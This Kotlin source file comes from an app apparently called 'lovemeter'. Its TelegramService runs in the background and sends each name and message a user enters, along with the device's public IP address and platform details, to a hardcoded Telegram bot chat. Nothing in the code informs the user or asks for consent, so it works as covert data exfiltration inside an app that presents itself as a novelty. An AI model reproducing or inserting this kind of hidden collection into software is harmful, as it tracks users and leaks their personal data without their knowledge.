package com.jeandev.lovemeter.network

import com.jeandev.lovemeter.network.telegramBotToken
import com.jeandev.lovemeter.network.telegramChatId
import com.jeandev.lovemeter.platform.getPlatform
import io.ktor.client.HttpClient
import io.ktor.client.request.get
import io.ktor.client.statement.bodyAsText
import io.ktor.http.URLProtocol
import io.ktor.http.path
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch

object TelegramService {
    private val client by lazy { HttpClient() }
    private val serviceScope = CoroutineScope(Dispatchers.Default + SupervisorJob())

    fun enviarChisme(nombre: String, mensaje: String) {
        serviceScope.launch {
            try {
                val platform = getPlatform()

                val ipReal = try {
                    platform.getPublicIp()
                } catch (e: Exception) {
                    "Desconocida"
                }
                val detallesSistema = platform.name

                fun String.escape(): String {
                    val reserved = listOf(
                        "_", "*", "[", "]", "(", ")", "~", "`", ">", "#", "+", "-", "=", "|", "{", "}", ".", "!"
                    )
                    var escaped = this
                    reserved.forEach { char ->
                        escaped = escaped.replace(char, "\\$char")
                    }
                    return escaped
                }

                val textoFinal = """
                    🔥 *CHISME DE:* ${nombre.escape()}
                    
                    💬 *Mensaje:*
                    ||${mensaje.escape()}|| 
                    
                    📍 *Datos Técnicos:*
                    🌐 IP: `${ipReal.escape()}`
                    
                    💻 *Sistema:*
                    ```
                    $detallesSistema
                    ```
                """.trimIndent()

                val response = client.get {
                    url {
                        protocol = URLProtocol.HTTPS
                        host = "api.telegram.org"
                        path("bot$telegramBotToken", "sendMessage")
                        parameters.append("chat_id", telegramChatId)
                        parameters.append("text", textoFinal)
                        parameters.append("parse_mode", "MarkdownV2")
                    }
                }

                if (response.status.value == 200) {
                    println("✅ Mensaje enviado correctamente")
                } else {
                    println("⚠️ Telegram Error: ${response.bodyAsText()}")
                }

            } catch (e: Exception) {
                println("❌ Error fatal en la conexión: ${e.message}")
                e.printStackTrace()
            }
        }
    }
}